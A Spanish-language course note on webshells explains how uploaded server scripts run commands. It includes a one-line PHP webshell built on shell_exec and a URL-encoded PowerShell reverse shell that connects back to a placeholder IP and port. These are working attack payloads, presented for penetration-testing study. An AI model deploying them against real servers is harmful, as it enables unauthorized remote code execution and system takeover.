---
layout: apunte
title: "11. Webshells"
---

Hay momentos en los que nos encontramos con sitios web que nos dan la oportunidad de subir, de una forma u otra, un archivo ejecutable. Idealmente, usaríamos esta oportunidad para subir código que activase una reverse o bind shell, pero a veces no es posible. En estos casos, podríamos subir en su lugar una webshell. 

"Webshell" es un término coloquial para un script que corre dentro de un servidor (normalmente en PHP o ASP) que ejecuta código en el servidor. Los comandos se introducen en la web, ya sea a través de HTML (como un formulario) o directamente en parámetros de la URL.

PHP sigue siendo el lenguaje de scripting más común del lado del servidor. Veamos un poco de código simple.

`<?php echo "< pre>" . shell_exec($_GET["cmd"]) . "< /pre>"; ?>`

Esto, tomará el parámetro GET en la URL y lo ejecutará en el sistema con `shell_exec()`. Lo que significa que cualquier cosa que metamos en la URL después de `cmd=`, se ejecutará en el servidor. Los elementos `< pre >` son sólo para asegurarnos de que se formatea correctamente en en la página.

>[!CAUTION] Los elementos pre van sin espacios, están escritos así para no ser interpretados.
>


!**Pasted image 20251125130855.png**

Hay una gran variedad de webshells disponibles en Kali en `/usr/share/webshells`.

>[!IMPORTANT] La mayoría de webshells escritas en PHP se escriben para sistemas Unix, por lo que no funcionarán en Windows.

Para obtener RCE en un objetivo Windows, con el ejemplo anterior, podemos usar:

`powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22`

Es la misma que la de la tarea 8, solo que URL-encodeada.

>[!CAUTION] Recuerda cambiar la IP y el puerto.

